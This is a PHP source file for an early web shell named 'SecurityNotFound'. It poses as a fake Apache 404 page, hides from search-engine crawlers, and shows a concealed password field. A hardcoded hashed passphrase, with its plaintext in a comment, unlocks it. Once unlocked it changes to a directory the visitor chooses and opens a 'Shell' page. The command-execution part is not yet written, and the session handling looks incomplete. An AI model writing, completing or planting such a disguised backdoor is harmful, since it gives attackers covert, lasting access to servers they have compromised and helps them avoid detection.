<?php

  /* Metadata
  >>>>>>>>>>>>>>>>> */
  define('__NAME__', 'SecurityNotFound');
  define('__AUTHOR__', '@CosasDePuma');

  /* Variables
  >>>>>>>>>>>>>>>>> */
  $passphrase = '136c757bdd877848762c248e58252935'; // cosasdepuma

  $theme = array(
    "clouds" => "#ecf0f1",
    "midnight" => "#2c3e50",
  
    "yellow" => "#ffe066",
    "dblue" => "#247ba0",
    "lblue" => "#70c1b3",
  );

  /* Headers
  >>>>>>>>>>>>>>>>> */
  header('HTTP/1.0 404 Not Found');
  header('X-Powered-By: Unicorns and kitties <3');

  /* Robots
  >>>>>>>>>>>>>>>>> */
  $robots = array(
    'Google', 'Yandex', 'MSNBot', 'Slurp', 'Rambler', 'ia_archiver'
  );

  foreach($robots as $robot)
    if(strpos($_SERVER['HTTP_USER_AGENT'],$robot) !== false)
      exit;

  /* Functions
  >>>>>>>>>>>>>>>>> */
  function InformationGathering() {
    $GLOBALS['INFO'] = array(
      'OS' => (strtolower(substr(PHP_OS,0,3)) == "win") ? "win" : "nix",
      'SHELL_CWD' => (isset($_POST['wd'])) ? $_POST['wd'] : getcwd(),
      'SHELL_ROOT' => getcwd()
    );
    @chdir($GLOBALS['INFO']['SHELL_CWD']);
    if($GLOBALS["INFO"]["OS"] == "win") {
      $GLOBALS["INFO"]["SHELL_ROOT"] = str_replace("\\", "/", $GLOBALS["INFO"]["SHELL_ROOT"]);
      $GLOBALS["INFO"]["SHELL_CWD"] = str_replace("\\", "/", $GLOBALS["INFO"]["SHELL_CWD"]);
    }
    if( $GLOBALS["INFO"]["SHELL_CWD"][strlen($GLOBALS["INFO"]["SHELL_CWD"])-1] != '/' ) 
      $GLOBALS["INFO"]["SHELL_CWD"] .= '/'; 
  }

  /* Web pages
  >>>>>>>>>>>>>>>>> */
  function ApacheNotFound() {
    ?>
  
    <h1>Not Found</h1>
    <p>The request URL <?=dirname($_SERVER['REQUEST_URI'])?> was not found on this server.</p>
    <hr>
    <address><?=$_SERVER['SERVER_SOFTWARE']?> Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address>

    <center>
      <form method="post">
        <input style="margin:0;background-color:#fff;border:0px" type="password" name="passwd">
      </form>
    </center>

    <?php exit;
  }

  function Shell() {
    ?>
      <!DOCTYPE html>
      <html lang="en">
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <meta http-equiv="X-UA-Compatible" content="ie=edge">
          <title>404 Security Not Found</title>
        </head>
        <body>
          <h1><?=$GLOBALS['INFO']['SHELL_ROOT']?></h1>
        </body>
      </html>
    <?php
  }

  /* Workflow
  >>>>>>>>>>>>>>>>> */
  if(isset($_GET['out'])) {
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    header("Refresh:0; url=" . explode('?', $_SERVER[REQUEST_URI])[0]);
    die();
  }

  if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if(empty($passphrase) || (isset($_POST['passwd']) && (md5(md5(md5($_POST['passwd']))) == $passphrase))) {
      $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
      ApacheNotFound();
    }
  }
  
  InformationGathering();
  Shell();
?>